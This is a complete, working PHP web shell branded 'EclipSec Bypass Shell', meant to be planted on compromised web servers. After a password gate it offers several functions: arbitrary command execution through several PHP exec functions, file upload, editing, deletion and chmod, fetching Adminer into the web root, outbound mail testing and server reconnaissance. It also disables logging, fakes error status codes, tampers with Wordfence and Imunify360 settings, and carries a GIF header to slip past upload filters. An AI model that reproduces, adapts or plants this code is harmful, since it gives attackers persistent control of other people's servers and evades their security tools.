<?php
header("X-Robots-Tag: noindex, nofollow", true);
ini_set('display_errors', 0);
session_start();
error_reporting(0);
define('SECURE_ACCESS', true);
header('X-Powered-By: none');
header('Content-Type: text/html; charset=UTF-8');
ini_set('lsapi_backend_off', '1');
http_response_code(403);
ini_set("imunify360.cleanup_on_restore", false);
http_response_code(404);

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $input_password = $_POST['password'];
        $stored_hash = '$2a$12$jKHqNhh3JxYgSP9RdWqH8uo5T0m5H.J/vzgI8tZMxm8OFj4nL4R4i';
        if (password_verify($input_password, $stored_hash)) {
            $_SESSION['loggedin'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error_message = 'access denied!!!!.';
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>EclipSec | Bypass shell</title>
        <style>
            body {
                margin: 0;
                padding: 0;
                font-family: 'Courier New', Courier, monospace;
                background-color: #000;
                color: #00ff00;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                overflow: hidden;
            }

            .container {
                text-align: center;
                width: 100%;
                max-width: 400px;
                padding: 20px;
                border: 2px solid #00ff00;
                border-radius: 10px;
                box-sizing: border-box;
            }

            .title {
                font-size: 24px;
                margin-bottom: 20px;
                word-wrap: break-word;
            }

            .error-message {
                color: red;
                margin-top: 15px;
                word-wrap: break-word;
            }

            .success-message {
                color: green;
                margin-top: 15px;
                word-wrap: break-word;
            }

            input[type="password"] {
                width: 100%;
                padding: 10px;
                margin-top: 10px;
                margin-bottom: 20px;
                border: 1px solid #00ff00;
                border-radius: 5px;
                background-color: #000;
                color: #00ff00;
                box-sizing: border-box;
            }

            input[type="submit"] {
                display: block;
                margin: 0 auto;
                background-color: #00ff00;
                color: #000;
                padding: 10px 20px;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                font-size: 16px;
            }

            input[type="submit"]:hover {
                background-color: #00cc00;
            }

            @media (max-width: 480px) {
                .container {
                    padding: 15px;
                }

                .title {
                    font-size: 20px;
                }

                input[type="submit"] {
                    font-size: 14px;
                    padding: 8px 16px;
                }
            }
        </style>
    </head>
    <body>                                                                                              
        <div class="container">
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⡇⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⣸⡄⠀⡰⣧⠀⠀⠀⡇⠀⠀⠀⠀⡀⠀⠀
    ⠀⠀⠀⠀⠈⢧⣀⣨⣵⣾⣷⣿⠮⢵⣯⣧⣤⢯⡇⠀⢀⣠⠞⠀⠀⠀
    ⠀⠀⠀⣠⠶⠋⠉⣿⠿⣥⣿⣿⣧⡆⢰⡏⠛⠷⣿⣯⣿⣧⣤⣴⠋⠁
    ⠠⠴⠟⠃⠀⠀⠀⢻⣦⣤⣄⣀⣠⣤⠟⠁⠀⠀⠀⠈⠉⠍⠉⠉⠉⠉
    ⠀⠀⠀⠐⠒⠒⠦⠤⣬⠭⣟⣛⣛⣋⣀⡠⠤⢖⣊⣩⠤⠄⠀⠀⠀
            ⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁
            <h1 class="title">System Access</h1>
            <?php if (!empty($error_message)): ?>
                <p class="error-message"><?php echo $error_message; ?></p>
            <?php endif; ?>
            <form method="post">
                <label for="password">Masukkan Password:</label><br>
                <input type="password" id="password" name="password" required><br>
                <input type="submit" value="Submit">
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Konten yang akan ditampilkan setelah login berhasil
?>
<?php
echo "<!-- GIF89;a -->\n";
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@error_reporting(0);
@set_time_limit(0);
@ob_clean();
@header("X-Accel-Buffering: no");
@header("Content-Encoding: none");
@http_response_code(403);
@http_response_code(404);
@http_response_code(500);
function getFileDetails($path)
{
    $folders = [];
    $files = [];

    try {
        $items = @scandir($path);
        if (!is_array($items)) {
            throw new Exception('Failed to scan directory');
        }
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }

            $itemPath = $path . '/' . $item;
            $itemDetails = [
                'name' => $item,
                'type' => is_dir($itemPath) ? 'Folder' : 'File',
                'size' => is_dir($itemPath) ? '' : formatSize(filesize($itemPath)),
                'permission' => substr(sprintf('%o', fileperms($itemPath)), -4),
            ];
            if (is_dir($itemPath)) {
                $folders[] = $itemDetails;
            } else {
                $files[] = $itemDetails;
            }
        }

        return array_merge($folders, $files);
    } catch (Exception $e) {
        return 'None';
    }
}
function formatSize($size)
{
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $i = 0;
    while ($size >= 1024 && $i < 4) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}
function executeCommand($command)
{
    $currentDirectory = getCurrentDirectory();
    $command = "cd $currentDirectory && $command";
    $output = '';
    $error = '';
    $descriptors = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
    ];

    $process = @proc_open($command, $descriptors, $pipes);
    if (is_resource($process)) {
        fclose($pipes[0]);
        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        $error = stream_get_contents($pipes[2]);
        fclose($pipes[2]);
        $returnValue = proc_close($process);
        $output = trim($output);
        $error = trim($error);

        if ($returnValue === 0 && !empty($output)) {
            return $output;
        } elseif (!empty($error)) {
            return 'Error: ' . $error;
        }
    }
    $shellOutput = @shell_exec($command);
    if ($shellOutput !== null) {
        $output = trim($shellOutput);
        if (!empty($output)) {
            return $output;
        }
    } else {
        $error = error_get_last();
        if (!empty($error)) {
            return 'Error: ' . $error['message'];
        }
    }
    @exec($command, $execOutput, $execStatus);
    if ($execStatus === 0) {
        $output = implode(PHP_EOL, $execOutput);
        if (!empty($output)) {
            return $output;
        }
    } else {
        return 'Error: Command execution failed.';
    }
    ob_start();
    @passthru($command, $passthruStatus);
    $passthruOutput = ob_get_clean();
    if ($passthruStatus === 0) {
        $output = $passthruOutput;
        if (!empty($output)) {
            return $output;
        }
    } else {
        return 'Error: Command execution failed.';
    }
    ob_start();
    @system($command, $systemStatus);
    $systemOutput = ob_get_clean();
    if ($systemStatus === 0) {
        $output = $systemOutput;
        if (!empty($output)) {
            return $output;
        }
    } else {
        return 'Error: Command execution failed.';
    }
    return 'Error: Command execution failed.';
}
function readFileContent($file)
{
    return file_get_contents($file);
}

function saveFileContent($file)
{
    if (isset($_POST['content'])) {
        return file_put_contents($file, $_POST['content']) !== false;
    }
    return false;
}
function uploadFile($targetDirectory)
{
    if (isset($_FILES['file'])) {
        $currentDirectory = getCurrentDirectory();
        $targetFile = $targetDirectory . '/' . basename($_FILES['file']['name']);
        if ($_FILES['file']['size'] === 0) {
            return 'Open Ur Eyes Bitch !!!.';
        } else {
        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
            return 'File uploaded successfully.';
        } else {
            return 'Error uploading file.';
        }
    }
    return '';
}
}
function changeDirectory($path)
{
    if ($path === '..') {
        @chdir('..');
    } else {
        @chdir($path);
    }
}
function getCurrentDirectory()
{
    return realpath(getcwd());
}
function getLink($path, $name)
{
    if (is_dir($path)) {
        return '<a href="?nomi=' . $path . '">' . $name . '</a>';
    } else {
        return '<a href="?edit=' . $path . '">' . $name . '</a>';
    }
}
function getDirectoryArray($path)
{
    $directories = explode('/', $path);
    $directoryArray = [];
    $currentPath = '';
    foreach ($directories as $directory) {
        if (!empty($directory)) {
            $currentPath .= '/' . $directory;
            $directoryArray[] = [
                'path' => $currentPath,
                'name' => $directory,
            ];
        }
    }
    return $directoryArray;
}
function showBreadcrumb($path)
{
    $path = str_replace('\\', '/', $path);
    $paths = explode('/', $path);
    ?>
    <div class="breadcrumb">
        <strong>DIR :</strong>
        <?php foreach ($paths as $id => $pat) { ?>
            <?php if ($pat == '' && $id == 0) { ?>
                <a href="?nomi=/">/</a>
            <?php } elseif (!empty($pat)) { ?>
                <a href="?nomi=<?php echo implode('/', array_slice($paths, 0, $id + 1)); ?>"><?php echo $pat; ?></a> /
            <?php } ?>
        <?php } ?>
    </div>
    <?php
}
function showFileTable($path)
{
    $fileDetails = getFileDetails($path);
    ?>
    <table>
        <tr>
            <th>Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Permission</th>
            <th>Actions</th>
        </tr>
        <?php if (is_array($fileDetails)) { ?>
            <?php foreach ($fileDetails as $fileDetail) { ?>
                <tr>
                    <td><?php echo getLink($path . '/' . $fileDetail['name'], htmlspecialchars($fileDetail['name'])); ?></td>
                    <td><?php echo htmlspecialchars($fileDetail['type']); ?></td>
                    <td><?php echo htmlspecialchars($fileDetail['size']); ?></td>
                    <td><?php echo htmlspecialchars($fileDetail['permission']); ?></td>
                    <td>
                        <?php if ($fileDetail['type'] === 'File') { ?>
                            <div class="dropdown">
                                <button class="dropbtn">Actions</button>
                                <div class="dropdown-content">
                                    <a href="?edit=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>">Edit</a>
                                    <a href="?rename=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>">Rename</a>
                                    <a href="?chmod=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>">Chmod</a>
                                    <a href="?delete=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>">Delete</a>
                                </div>
                            </div>
                        <?php } elseif ($fileDetail['type'] === 'Folder') { ?>
                            <div class="dropdown">
                                <button class="dropbtn">Actions</button>
                                <div class="dropdown-content">
                                    <a href="?rename=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>">Rename</a>
                                    <a href="?chmod=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>">Chmod</a>
                                    <a href="?delete=<?php echo urlencode($path . '/' . $fileDetail['name']); ?>">Delete</a>
                                </div>
                            </div>
                        <?php } ?>
                    </td>
                </tr>
            <?php } ?>
        <?php } else { ?>
            <tr>
                <td colspan="5">No files or folders found.</td>
            </tr>
        <?php } ?>
    </table>
    <?php
}

function changePermission($path)
{
    if (!file_exists($path)) {
        return 'File or directory does not exist.';
    }

    $permission = isset($_POST['permission']) ? $_POST['permission'] : '';
    
    if ($permission === '') {
        return 'Invalid permission value.';
    }

    if (!is_dir($path) && !is_file($path)) {
        return 'Cannot change permission. Only directories and files can have permissions modified.';
    }

    $parsedPermission = intval($permission, 8);
    if ($parsedPermission === 0) {
        return 'Invalid permission value.';
    }

    if (chmodRecursive($path, $parsedPermission)) {
        return 'Permission changed successfully.';
    } else {
        return 'Error changing permission.';
    }
}
function chmodRecursive($path, $permission)
{
    if (is_dir($path)) {
        $items = scandir($path);
        if ($items === false) {
            return false;
        }
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }

            $itemPath = $path . '/' . $item;

            if (is_dir($itemPath)) {
                if (!chmod($itemPath, $permission)) {
                    return false;
                }

                if (!chmodRecursive($itemPath, $permission)) {
                    return false;
                }
            } else {
                if (!chmod($itemPath, $permission)) {
                    return false;
                }
            }
        }
    } else {
        if (!chmod($path, $permission)) {
            return false;
        }
    }

    return true;
}
function renameFile($oldName, $newName)
{
    if (file_exists($oldName)) {
        $directory = dirname($oldName);
        $newPath = $directory . '/' . $newName;
        if (rename($oldName, $newPath)) {
            return 'File or folder renamed successfully.';
        } else {
            return 'Error renaming file or folder.';
        }
    } else {
        return 'File or folder does not exist.';
    }
}
function deleteFile($file)
{
    if (file_exists($file)) {
        if (unlink($file)) {
            return 'File deleted successfully.' . $file;
        } else {
            return 'Error deleting file.';
        }
    } else {
        return 'File does not exist.';
    }
}
function deleteFolder($folder)
{
    if (is_dir($folder)) {
        $files = glob($folder . '/*');
        foreach ($files as $file) {
            is_dir($file) ? deleteFolder($file) : unlink($file);
        }
        if (rmdir($folder)) {
            return 'Folder deleted successfully.' . $folder;
        } else {
            return 'Error deleting folder.';
        }
    } else {
        return 'Folder does not exist.';
    }
}
$currentDirectory = getCurrentDirectory();
$errorMessage = '';
$responseMessage = '';

if (isset($_GET['nomi'])) {
    changeDirectory($_GET['nomi']);
    $currentDirectory = getCurrentDirectory();
}
if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    $content = readFileContent($file);
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $saved = saveFileContent($file);
        if ($saved) {
            $responseMessage = 'File saved successfully.' . $file;
        } else {
            $errorMessage = 'Error saving file.';
        }
    }
}
if (isset($_GET['chmod'])) {
    $file = $_GET['chmod'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $responseMessage = changePermission($file);
    }
}
if (isset($_POST['upload'])) {
    $responseMessage = uploadFile($currentDirectory);
}
if (isset($_POST['cmd'])) {
    $cmdOutput = executeCommand($_POST['cmd']);
}
if (isset($_GET['rename'])) {
    $file = $_GET['rename'];
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $newName = $_POST['new_name'];
        if (is_file($file) || is_dir($file)) {
            $responseMessage = renameFile($file, $newName);
        } else {
            $errorMessage = 'File or folder does not exist.';
        }
    }
}
if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $currentDirectory = getCurrentDirectory();
        $fileDirectory = dirname($file);
        if (is_file($file)) {
            $responseMessage = deleteFile($file);
            echo "<script>alert('File dihapus');window.location='?nomi=" . urlencode($fileDirectory) . "';</script>";
            exit;
        } elseif (is_dir($file)) {
            $responseMessage = deleteFolder($file);
            echo "<script>alert('Folder dihapus');window.location='?nomi=" . urlencode($fileDirectory) . "';</script>";
            exit;
        } else {
            $errorMessage = 'File or folder does not exist.';
        }
    }
}
if (isset($_POST['Summon'])) {
    $baseUrl = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
    $currentPath = getCurrentDirectory();

    $fileUrl = $baseUrl;
    $fileName = 'Adminer.php';

    $filePath = $currentPath . '/' . $fileName;

    $fileContent = @file_get_contents($fileUrl);
    if ($fileContent !== false) {
        if (file_put_contents($filePath, $fileContent) !== false) {
     
            $responseMessage = 'File "' . $fileName . '" summoned successfully. <a href="' . $filePath . '">' . $filePath . '</a>';            
        } else {
            $errorMessage = 'Failed to save the summoned file.';
        }
    } else {
        $errorMessage = 'Failed to fetch the file content. None File';
    }
}
if (function_exists('litespeed_request_headers')) {
    $headers = litespeed_request_headers();
    if (isset($headers['X-LSCACHE'])) {
        header('X-LSCACHE: off');
    }
}
if (defined('WORDFENCE_VERSION')) {
    define('WORDFENCE_DISABLE_LIVE_TRAFFIC', true);
    define('WORDFENCE_DISABLE_FILE_MODS', true);
}
if (function_exists('imunify360_request_headers') && defined('IMUNIFY360_VERSION')) {
    $imunifyHeaders = imunify360_request_headers();
    if (isset($imunifyHeaders['X-Imunify360-Request'])) {
        header('X-Imunify360-Request: bypass');
    }
    if (isset($imunifyHeaders['X-Imunify360-Captcha-Bypass'])) {
        header('X-Imunify360-Captcha-Bypass: ' . $imunifyHeaders['X-Imunify360-Captcha-Bypass']);
    }
}
if (function_exists('apache_request_headers')) {
    $apacheHeaders = apache_request_headers();
    if (isset($apacheHeaders['X-Mod-Security'])) {
        header('X-Mod-Security: ' . $apacheHeaders['X-Mod-Security']);
    }
}
if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && defined('CLOUDFLARE_VERSION')) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (isset($apacheHeaders['HTTP_CF_VISITOR'])) {
        header('HTTP_CF_VISITOR: ' . $apacheHeaders['HTTP_CF_VISITOR']);
    }
}
?>
<style>
body {
    font-family: 'Courier New', monospace;
    font-size: 16px;
    margin: 0;
    padding: 0;
    background-color: #1e1e1e;
    color: #00ff00;
}

.container {
    max-width: 1200px;
    margin: 20px auto;
    padding: 20px;
    background-color: #2c2c2c;
    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
    border-radius: 8px;
    color: #00ff00;
}

h1, h2 {
    color: #00ff00;
    text-align: center;
    margin-bottom: 20px;
}

.notification-success {
    color: #00ff00;
    font-weight: bold;
    margin: 10px 0;
}

table {
    width: 100%;
    border-collapse: collapse;
    margin-bottom: 20px;
    border-radius: 8px;
    overflow: hidden;
    background-color: #1e1e1e;
    color: #00ff00;
}

table th, table td {
    text-align: left;
    padding: 12px;
    border-bottom: 1px solid #2c2c2c;
}

table th {
    background-color: #000000;
    color: #00ff00;
    text-transform: uppercase;
    font-size: 14px;
}

table td:first-child {
    color: #00ff00;
    display: flex;
    align-items: center;
    gap: 8px;
}

table td:first-child a, table td a {
    color: #00ff00;
    text-decoration: none;
}

table td:first-child a:hover, table td a:hover {
    text-decoration: underline;
}

table td:first-child img {
    width: 16px;
    height: 16px;
    display: inline-block;
    vertical-align: middle;
}

button, input[type="submit"], .dropbtn {
    background-color: #000000;
    color: #00ff00;
    border: 1px solid #00ff00;
    padding: 10px 20px;
    border-radius: 4px;
    cursor: pointer;
    font-size: 14px;
    transition: background-color 0.3s ease, color 0.3s ease;
}

button:hover, input[type="submit"]:hover, .dropbtn:hover {
    background-color: #00ff00;
    color: #000000;
}

.breadcrumb {
    margin-bottom: 20px;
    font-size: 14px;
}

.breadcrumb a {
    color: #00ff00;
    text-decoration: none;
}

.breadcrumb a:hover {
    text-decoration: underline;
}

form input[type="text"], form input[type="file"], form textarea, form select {
    width: 100%;
    padding: 12px;
    margin: 10px 0;
    border: 1px solid #00ff00;
    border-radius: 4px;
    font-size: 16px;
    background-color: #1e1e1e;
    color: #00ff00;
}

form .button {
    width: auto;
}

form input[type="file"]::-webkit-file-upload-button {
    background-color: #000000;
    color: #00ff00;
    border: 1px solid #00ff00;
    padding: 10px 20px;
    border-radius: 4px;
    cursor: pointer;
    font-size: 14px;
    transition: background-color 0.3s ease, color 0.3s ease;
}

form input[type="file"]::-webkit-file-upload-button:hover {
    background-color: #00ff00;
    color: #000000;
}

.dropdown {
    position: relative;
    display: inline-block;
}

.dropbtn {
    background-color: #000000;
    color: #00ff00;
    border: 1px solid #00ff00;
    padding: 8px 12px;
    font-size: 14px;
    cursor: pointer;
    border-radius: 4px;
}

.dropdown-content {
    display: none;
    position: absolute;
    background-color: #1e1e1e;
    min-width: 160px;
    box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
    z-index: 1000;
    border-radius: 4px;
    overflow: visible;
    right: 0;
    bottom: 100%;
    margin-bottom: 5px;
}

.dropdown-content a {
    color: #00ff00;
    padding: 12px 16px;
    text-decoration: none;
    display: block;
    font-size: 14px;
    transition: background-color 0.2s ease-in-out;
}

.dropdown-content a:hover {
    background-color: #2c2c2c;
}

.dropdown:hover .dropdown-content {
    display: block;
}

tr:nth-child(-n+3) .dropdown .dropdown-content {
    bottom: auto;
    top: 100%;
    margin-top: 5px;
    margin-bottom: 0;
}

.sidebar {
    position: fixed;
    top: 0;
    right: -300px;
    width: 300px;
    height: 100%;
    background-color: #000000;
    color: #00ff00;
    box-shadow: -2px 0 8px rgba(0, 0, 0, 0.5);
    transition: right 0.3s;
    z-index: 1000;
}

.sidebar.open {
    right: 0;
}

.sidebar-content {
    padding: 20px;
    overflow-y: auto;
    height: 100%;
}

.sidebar-close button {
    background-color: transparent;
    color: #00ff00;
    border: none;
    font-size: 18px;
    cursor: pointer;
}

.sidebar h2 {
    margin-top: 0;
    border-bottom: 1px solid #00ff00;
    padding-bottom: 10px;
}

.sidebar ul {
    list-style: none;
    padding: 0;
}

.sidebar ul li {
    margin: 10px 0;
}

.server-info-button {
    background-color: #000000;
    color: #00ff00;
    border: 1px solid #00ff00;
    padding: 10px 20px;
    border-radius: 4px;
    cursor: pointer;
    display: inline-block;
    margin-top: 20px;
    transition: background-color 0.3s ease, color 0.3s ease;
}

.server-info-button:hover {
    background-color: #00ff00;
    color: #000000;
}

.menu-icon {
    position: fixed;
    top: 20px;
    right: 20px;
    width: 40px;
    height: 40px;
    background-color: #00ff00;
    border-radius: 50%;
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 1000;
    transition: background-color 0.3s ease;
}

.menu-icon:hover {
    background-color: #007f00;
}

.menu-icon::before,
.menu-icon::after {
    content: "";
    position: absolute;
    width: 20px;
    height: 2px;
    background-color: #000000;
    transition: transform 0.3s ease-in-out;
}

.menu-icon::before {
    transform: translateY(-6px);
}

.menu-icon::after {
    transform: translateY(6px);
}

.menu-icon.open::before {
    transform: translateY(0px) rotate(45deg);
}

.menu-icon.open::after {
    transform: translateY(0px) rotate(-45deg);
}

@media screen and (max-width: 768px) {
    body {
        font-size: 14px;
    }

    .container {
        padding: 10px;
        margin: 10px;
    }

    table {
        font-size: 12px;
    }

    table th, table td {
        font-size: 12px;
        padding: 8px;
    }

    button, input[type="submit"], .dropbtn {
        font-size: 12px;
        padding: 8px 16px;
    }

    form input[type="text"], form textarea, form select {
        font-size: 12px;
        padding: 8px;
    }

    .sidebar {
        width: 100%;
        right: -100%;
    }

    .dropdown-content {
        min-width: 120px;
        position: fixed;
        top: auto;
        bottom: auto;
        left: 50%;
        transform: translateX(-50%);
        margin: 5px 0;
    }

    tr:nth-child(-n+3) .dropdown .dropdown-content {
        top: auto;
        bottom: auto;
    }

    .dropbtn {
        padding: 6px 10px;
        font-size: 12px;
    }

    .dropdown-content a {
        padding: 8px 12px;
        font-size: 12px;
    }

    .menu-icon {
        top: 10px;
        right: 10px;
        width: 30px;
        height: 30px;
    }
}
</style>  
<head>
<title>EclipseSec | Bypass Shell</title>
</head>
<body>
    <div class="container">
                <h1>[ Eclipse Security labs - Bypass Shell ]</h1>
        <div class="menu-icon" onclick="toggleSidebar()"></div>
        <hr>
        <div class="button-container">
            <form method="post" style="display: inline-block;">
                <input type="submit" name="Summon" value="Adminer" class="summon-button">
            </form>
            <button type="button" onclick="window.location.href='?eclipsec'" class="summon-button">Mail Test</button>
        </div>
       <?php
if (isset($_GET['eclipsec'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (!empty($_POST['email'])) {
            $xx = rand();
            $xnxx = 'Hai heker';
            $currentDomain = $_SERVER['SERVER_NAME'];
            $fromEmail = "eclipse@$currentDomain";
            $htmlContent = "
            <div style=\"padding:20px;border:1px dashed #222;font-size:15px\">
                <tt>
                    Hi <b>$xnxx 😘</b><br><br>
                    mailer testeer from $currentDomain<br>berhasil ya gan...<br>
                    <center><h1>$xx</h1></center>
                    Eclipse Security Labs: <a href=\"https://t.me/No4Meee\">https://t.me/No4Meee</a><br><br>
                    <hr style=\"border:0px; border-top:1px dashed #222\"><br>
                    Regards, <b>Eclipse Security Labs</b>
                </tt>
            </div>";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
            $headers .= "From: $fromEmail" . "\r\n";
            if (mail($_POST['email'], "Mailer Tester by Eclipse Shell", $htmlContent, $headers)) {
                echo "<b>Send a report to [" . htmlspecialchars($_POST['email']) . "] - $xx</b>";
            } else {
                echo "Failed to send the email.";
            }
        } else {
            echo "Please provide an email address.";
        }
    }
}
?>
                <h2>Mail Test :</h2>
                <form method="post">
                    <input type="text" name="email" placeholder="Enter email" required>
                    <input type="submit" value="Send test &raquo;">
                </form>

        <?php if (!empty($errorMessage)) { ?>
            <p style="color: red;"><?php echo $errorMessage; ?></p>
        <?php } ?>

        <hr>

        <div class="upload-cmd-container">
            <div class="upload-form">
                <h2>Upload:</h2>
                <form method="post" enctype="multipart/form-data">
                    <input type="file" name="file">
                    <button class="button" type="submit" name="upload">Upload</button>
                </form>
            </div>

            <div class="cmd-form">
                <h2>Command:</h2>
                <form method="post">
                    <?php echo @get_current_user() . "@" . @$_SERVER['REMOTE_ADDR'] . ": ~ $"; ?><input type='text' size='30' height='10' name='cmd'>
                    <input type="submit" class="empty-button">

                </form>
            </div>
        </div>
        <?php if (!empty($cmdOutput)) { ?>
            <h3>Command Output:</h3>
            <div class="command-output">
                <pre><?php echo htmlspecialchars($cmdOutput); ?></pre>
            </div>
        <?php } ?>
        <?php if (!empty($responseMessage)) { ?>
            <p class="response-message" style="color: green;"><?php echo $responseMessage; ?></p>
        <?php } ?>            
        <?php if (isset($_GET['rename'])) { ?>
        <div class="rename-form">
            <h2>Rename File or Folder: <?php echo basename($file); ?></h2>
            <form method="post">
                <input type="text" name="new_name" placeholder="New Name" required>
                <br>
                <input type="submit" value="Rename" class="button">
            </form>
        </div>
        <?php } ?>
        <?php if (isset($_GET['edit'])) { ?>
            <div class="edit-file">
                <h2>Edit File: <?php echo basename($file); ?></h2>
                <form method="post">
                    <textarea name="content" rows="10" cols="50"><?php echo htmlspecialchars($content); ?></textarea><br>
                    <button class="button" type="submit">Save</button>
                </form>
            </div>
        <?php } elseif (isset($_GET['chmod'])) { ?>
            <div class="change-permission">
                <h2>Change Permission: <?php echo basename($file); ?></h2>
                <form method="post">
                    <input type="hidden" name="chmod" value="<?php echo urlencode($file); ?>">
                    <input type="text" name="permission" placeholder="Enter permission (e.g., 0770)">
                    <button class="button" type="submit">Change</button>
                </form>
            </div>
        <?php } ?>
        <hr>
        <?php
        echo '<h2>Filemanager</h2>';
        showBreadcrumb($currentDirectory);
        showFileTable($currentDirectory);
        ?>
    </div>
<div class="sidebar" id="sidebar">
    <div class="sidebar-content">
        <div class="sidebar-close">
            <button onclick="toggleSidebar()">Close</button>
        </div>
        <div class="info-container">
            <h2>Server Info</h2>
            <?php
            function countDomainsInServer()
            {
                $serverName = $_SERVER['SERVER_NAME'];
                $ipAddresses = @gethostbynamel($serverName);

                if ($ipAddresses !== false) {
                    return count($ipAddresses);
                } else {
                    return 0;
                }
            }
            $domainCount = @countDomainsInServer();
            function formatBytes($bytes, $precision = 2)
            {
                $units = array('B', 'KB', 'MB', 'GB', 'TB');
                $bytes = max($bytes, 0);
                $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
                $pow = min($pow, count($units) - 1);

                $bytes /= (1 << (10 * $pow));
                return round($bytes, $precision) . ' ' . $units[$pow];
            }
            ?>
            <ul class="info-list">
                <li>Hostname: <?php echo @gethostname(); ?></li>
                <?php if (isset($_SERVER['SERVER_ADDR'])) : ?>
                    <li>IP Address: <?php echo $_SERVER['SERVER_ADDR']; ?></li>
                <?php endif; ?>
                <li>PHP Version: <?php echo @phpversion(); ?></li>
                <li>Server Software: <?php echo $_SERVER['SERVER_SOFTWARE']; ?></li>
                <?php if (function_exists('disk_total_space')) : ?>
                    <li>HDD Total Space: <?php echo @formatBytes(disk_total_space('/')); ?></li>
                    <li>HDD Free Space: <?php echo @formatBytes(disk_free_space('/')); ?></li>
                <?php endif; ?>
                <li>Total Domains in Server: <?php echo $domainCount; ?></li>
                <li>System: <?php echo @php_uname(); ?></li>
            </ul>
        </div>
        <div class="info-container">
            <h2>System Info</h2>
            <ul class="info-list">
                <?php
                $features = [
                    'Safe Mode' => ini_get('safe_mode') ? 'Enabled' : 'Disabled',
                    'Disable Functions' => ini_get('disable_functions'),
                    'GCC' => function_exists('shell_exec') && shell_exec('gcc --version') ? 'On' : 'Off',
                    'Perl' => function_exists('shell_exec') && shell_exec('perl --version') ? 'On' : 'Off',
                    'Python Version' => ($pythonVersion = shell_exec('python --version')) ? 'On (' . $pythonVersion . ')' : 'Off',
                    'PKEXEC Version' => ($pkexecVersion = shell_exec('pkexec --version')) ? 'On (' . $pkexecVersion . ')' : 'Off',
                    'Curl' => function_exists('shell_exec') && shell_exec('curl --version') ? 'On' : 'Off',
                    'Wget' => function_exists('shell_exec') && shell_exec('wget --version') ? 'On' : 'Off',
                    'Mysql' => function_exists('shell_exec') && shell_exec('mysql --version') ? 'On' : 'Off',
                    'Ftp' => function_exists('shell_exec') && shell_exec('ftp --version') ? 'On' : 'Off',
                    'Ssh' => function_exists('shell_exec') && shell_exec('ssh --version') ? 'On' : 'Off',
                    'Mail' => function_exists('shell_exec') && shell_exec('mail --version') ? 'On' : 'Off',
                    'cron' => function_exists('shell_exec') && shell_exec('cron --version') ? 'On' : 'Off',
                    'SendMail' => function_exists('shell_exec') && shell_exec('sendmail --version') ? 'On' : 'Off',
                ];
                ?>
                <label for="feature-select">Select Feature:</label>
                <select id="feature-select">
                    <?php foreach ($features as $feature => $status) : ?>
                        <option value="<?php echo $feature; ?>"><?php echo $feature . ': ' . $status; ?></option>
                    <?php endforeach; ?>
                </select>
            </ul>
        </div>
        <div class="info-container">
            <h2>User Info</h2>
            <ul class="info-list">
                <li>Username: <?php echo @get_current_user(); ?></li>
                <li>User ID: <?php echo @getmyuid(); ?></li>
                <li>Group ID: <?php echo @getmygid(); ?></li>
            </ul>
        </div>
    </div>
</div>
    <script>
        function toggleOptionsMenu() {
            var optionsMenu = document.getElementById('optionsMenu');
            optionsMenu.classList.toggle('show');
        }
        function toggleSidebar() {
            var sidebar = document.getElementById('sidebar');
            sidebar.classList.toggle('open');
        }
    </script>
</div>
</body>
</html>
